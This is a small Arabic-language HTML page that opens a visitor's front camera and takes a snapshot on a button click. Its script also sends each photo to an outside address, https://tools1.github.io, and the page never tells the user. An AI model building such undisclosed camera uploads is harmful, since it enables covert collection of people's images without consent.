<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تصوير من الكاميرا الأمامية</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        video {
            border: 2px solid #2c3e50;
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }
        canvas {
            display: none;
        }
        button {
            padding: 10px 20px;
            background-color: #2c3e50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #34495e;
        }
    </style>
</head>
<body>

    <h1>تصوير من الكاميرا الأمامية</h1>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <br>
    <button id="snap">التقاط صورة</button>
    <br>
    <img id="photo" alt="الصورة الملتقطة" style="margin-top: 20px;">

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const snap = document.getElementById('snap');
        const photo = document.getElementById('photo');
        const context = canvas.getContext('2d');

        // طلب الوصول إلى الكاميرا الأمامية
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then((stream) => {
                video.srcObject = stream;
            })
            .catch((err) => {
                console.error("خطأ في الوصول إلى الكاميرا:", err);
            });

        // التقاط الصورة
        snap.addEventListener('click', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/png');
            photo.setAttribute('src', dataUrl);
            photo.style.display = 'block';

            // إرسال الصورة إلى الخادم
            fetch('https://tools1.github.io', {
                method: 'POST',
                body: JSON.stringify({ image: dataUrl }),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(response => response.json())
            .then(data => {
                console.log("تم تحميل الصورة:", data);
            })
            .catch((error) => {
                console.error("خطأ في تحميل الصورة:", error);
            });
        });
    </script>

</body>
</html>
